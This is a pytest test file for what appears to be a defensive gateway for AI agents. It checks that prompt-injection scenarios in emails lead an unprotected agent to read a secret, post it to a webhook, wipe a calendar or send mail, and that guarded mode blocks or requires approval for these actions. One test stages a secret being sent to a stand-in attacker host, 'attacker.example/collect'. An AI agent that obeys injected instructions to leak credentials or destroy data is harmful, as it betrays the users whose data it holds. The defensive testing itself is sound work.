from ajan_kalkani.models import IntentContract, RunMode
from ajan_kalkani.sandbox import Sandbox
from ajan_kalkani.scenarios import SCENARIOS, Scenario, ScenarioStep, get_scenario
from ajan_kalkani.service import _attack_succeeded, _redact, run_scenario


def test_email_injection_is_compromised_without_gateway() -> None:
    result = run_scenario("email_prompt_injection", RunMode.UNPROTECTED)
    assert result.task_success is True
    assert result.attack_success is True
    assert result.status == "compromised"
    assert result.metrics.sensitive_reads == 1
    assert result.metrics.external_writes == 1


def test_email_injection_is_blocked_with_gateway_and_secrets_are_redacted() -> None:
    result = run_scenario("email_prompt_injection", RunMode.GUARDED)
    serialized = result.model_dump_json()
    assert result.task_success is True
    assert result.attack_success is False
    assert result.status == "protected"
    assert result.metrics.blocked_calls == 2
    assert "PROD_CREDENTIAL_7F3C1" not in serialized
    assert {event.rule_id for event in result.events if event.rule_id} >= {
        "contract.explicit-deny",
        "dataflow.sensitive-to-external",
    }


def test_calendar_destructive_call_is_blocked() -> None:
    baseline = run_scenario("calendar_wipe_injection", RunMode.UNPROTECTED)
    guarded = run_scenario("calendar_wipe_injection", RunMode.GUARDED)
    assert baseline.attack_success is True
    assert guarded.attack_success is False
    assert guarded.task_success is True


def test_safe_task_completes_in_both_modes() -> None:
    for mode in RunMode:
        result = run_scenario("safe_email_draft", mode)
        assert result.task_success is True
        assert result.attack_success is False


def test_taint_labels_are_propagated_without_scenario_annotations() -> None:
    result = run_scenario("email_prompt_injection", RunMode.GUARDED)
    webhook_gateway_event = next(
        event
        for event in result.events
        if event.actor == "gateway" and event.action == "webhook.post"
    )
    webhook_agent_event = next(
        event
        for event in result.events
        if event.actor == "agent" and event.action == "webhook.post"
    )

    assert webhook_gateway_event.rule_id == "dataflow.sensitive-to-external"
    assert "secret" in webhook_agent_event.detail


def test_untrusted_email_cannot_send_without_approval() -> None:
    baseline = run_scenario("email_send_injection", RunMode.UNPROTECTED)
    guarded = run_scenario("email_send_injection", RunMode.GUARDED)

    assert baseline.task_success is True
    assert baseline.attack_success is True
    assert guarded.task_success is True
    assert guarded.attack_success is False
    assert guarded.metrics.approval_requests == 1
    assert any(
        event.rule_id == "contract.human-approval" for event in guarded.events
    )


def test_safe_calendar_read_has_no_false_block() -> None:
    guarded = run_scenario("safe_calendar_read", RunMode.GUARDED)
    assert guarded.task_success is True
    assert guarded.attack_success is False
    assert guarded.metrics.blocked_calls == 0


def test_file_labels_come_from_metadata_not_filename() -> None:
    sandbox = Sandbox.for_scenario("email_prompt_injection")

    secret_labels = sandbox.labels_for_output(
        "file.read",
        {"path": "/workspace/config/runtime.txt"},
        {},
    )
    benign_labels = sandbox.labels_for_output(
        "file.read",
        {"path": "/workspace/tokenizer.txt"},
        {},
    )

    assert "secret" in secret_labels
    assert "secret" not in benign_labels
    assert benign_labels == {"public"}


def test_webhook_attack_requires_real_sensitive_payload_and_target() -> None:
    scenario = get_scenario("email_prompt_injection")
    assert scenario is not None
    sandbox = Sandbox.for_scenario(scenario.id)
    target = "https://attacker.example/collect"

    sandbox.webhook_posts.append({"url": target, "payload": "harmless"})
    assert _attack_succeeded(scenario, sandbox) is False

    secret = sandbox.files["/workspace/config/runtime.txt"].content
    sandbox.webhook_posts.append({"url": "https://safe.example", "payload": secret})
    assert _attack_succeeded(scenario, sandbox) is False

    sandbox.webhook_posts.append({"url": target, "payload": {"value": secret}})
    assert _attack_succeeded(scenario, sandbox) is True


def test_taint_aware_redaction_masks_nonstandard_secret_formats() -> None:
    redacted = _redact(
        {
            "url": "https://example.test/PROD_CREDENTIAL_7F3C1",
            "payload": "PROD_CREDENTIAL_7F3C1",
        },
        force_sensitive=True,
    )
    assert "PROD_CREDENTIAL_7F3C1" not in str(redacted)


def test_tool_error_marks_run_failed(monkeypatch) -> None:
    scenario = Scenario(
        id="tool_error",
        name="Araç hatası",
        description="Hata durumunu doğrular.",
        task="Taslak oluştur.",
        category="test",
        contract=IntentContract(task="Taslak oluştur.", allow=["missing.tool"]),
        steps=(ScenarioStep(tool="missing.tool"),),
        task_effect="draft_created",
        attack_effect="none",
        task_expectation={"to": "nobody@example.test"},
    )
    monkeypatch.setitem(SCENARIOS, scenario.id, scenario)

    result = run_scenario(scenario.id, RunMode.UNPROTECTED)

    assert result.status == "failed"
    assert result.task_success is False
    assert result.metrics.attempted_calls == 1
    assert result.metrics.execution_errors == 1
    assert any(event.decision == "error" for event in result.events)
